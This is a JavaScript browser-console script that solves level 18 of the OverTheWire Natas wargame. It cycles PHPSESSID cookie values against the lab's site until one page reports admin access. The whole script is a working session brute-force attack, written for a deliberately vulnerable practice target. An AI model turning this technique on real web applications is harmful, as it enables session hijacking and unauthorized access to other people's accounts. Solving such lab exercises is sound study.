(async function Natas18(){
    const url ='http://natas18.natas.labs.overthewire.org/index.php?debug';
    
    const adminRegex = /You are an admin/
    const maxSessions = 640;
    
    /*/
    const possibleSessionIds = (new Array(maxSessions)).fill(0).map((x,i)=>i+1);
    const pages = await Promise.all(possibleSessionIds.map(id => {
        document.cookie = `PHPSESSID=${id}`;    // I can't seem to set cookie as part of the `Fetch()` `options.headers.cookie)`, so just do it here
        return fetch(url).then(x=>x.text());
    }));
    console.info('Pages:', pages);

    pages.forEach((html, id) => {
        //console.info(html);
        if(adminRegex.test(html)){
            console.log(`Sucess with ${id}`, html);
        }
    });
    /*/ //I wanted tp promise.all and map, but the fact I cant set cookies in Fetch causes races when I set in the document.cookie of each promise,
    let finished = false;
    for (let i = 0; i < maxSessions+1 && !finished; i++){
        document.cookie = `PHPSESSID=${i}`;    // I can't seem to set cookie as part of the `Fetch()` `options.headers.cookie)`, so just do it here
        const page = await fetch(url).then(x => x.text());
        
        if (adminRegex.test(page)){
            console.log(`Got in with id ${i}\n`,page);
            finished = true;   
        }
    }
    //*/
})();